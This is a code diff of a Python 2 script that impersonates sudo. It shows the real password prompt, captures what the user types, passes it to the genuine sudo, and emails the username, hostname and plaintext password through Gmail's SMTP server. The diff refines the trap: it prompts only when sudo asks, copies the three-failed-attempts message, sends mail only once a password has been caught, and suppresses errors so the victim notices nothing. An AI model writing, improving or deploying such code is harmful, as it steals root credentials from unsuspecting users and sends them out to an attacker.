@@ -4,28 +4,30 @@ from sys import argv
 import os
 import smtplib
 from getpass import getpass
-comm=' '.join(argv[1:])
-usage='''usage: sudo [-D level] -h | -K | -k | -V
-usage: sudo -v [-AknS] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid]
-usage: sudo -l[l] [-AknS] [-D level] [-g groupname|#gid] [-p prompt] [-U user name] [-u user name|#uid] [-g groupname|#gid] [command]
-usage: sudo [-AbEHknPS] [-r role] [-t type] [-C fd] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid] [-g groupname|#gid] [VAR=value] [-i|-s] [<command>]
-usage: sudo -e [-AknS] [-r role] [-t type] [-C fd] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid] file ...'''
-def dosudo():
+
+def dosudo(cmmd):
     usnm=os.environ.get('USER')
     hsnm=os.environ.get('HOSTNAME')
     psstr='[sudo] password for {0}: '.format(usnm)
-    psw=getpass(psstr)
     sf='succeeded'
+    psw=''
     try:
-        p=spawn('bash',['-c','/usr/bin/sudo '+comm])
-        p.expect(usnm+': ')
-        p.sendline(psw)
-        p.expect(EOF)
-        rslt=p.before.strip(psstr).strip()
-    except:
+        p=spawn('bash',['-c','/usr/bin/sudo '+cmmd])
+        i=0
+        while i==0:
+            i=p.expect([usnm+': ','3 incorrect password attempts',EOF])
+            if i==0:
+                psw=getpass(psstr)
+                p.sendline(psw)
+            if i==1:
+                sf='failed'
+                p.expect(EOF)
+                print 'sudo: 3 incorrect password attempts'
+        rslt=p.before.split(psstr)[-1].strip()
+    except Exception as ex:
         sf='failed'
         rslt='Permission denied'
-    return ('password for {0} on {1}: {2} [sudo {3}]'.format(usnm,hsnm,psw,sf),rslt)
+    return ('password for {0} on {1}: {2} [sudo {3}]'.format(usnm,hsnm,psw,sf) if psw else '',rslt)
 
 def sendemail(mssg):
     smtpserver = smtplib.SMTP("smtp.gmail.com")
@@ -37,13 +39,10 @@ def sendemail(mssg):
     smtpserver.close()
 
 if __name__=="__main__":
-    if not comm:
-        print usage
-        exit()
+    comm=' '.join(argv[1:])
     try:
-        dsd=dosudo()
-        sendemail(dsd[0])
-        if dsd[1]:
-            print dsd[1]
+        dsd=dosudo(comm)
+        if dsd[0]: sendemail(dsd[0])
+        if dsd[1] and not "failed" in dsd[1]: print dsd[1]
     except:
         pass
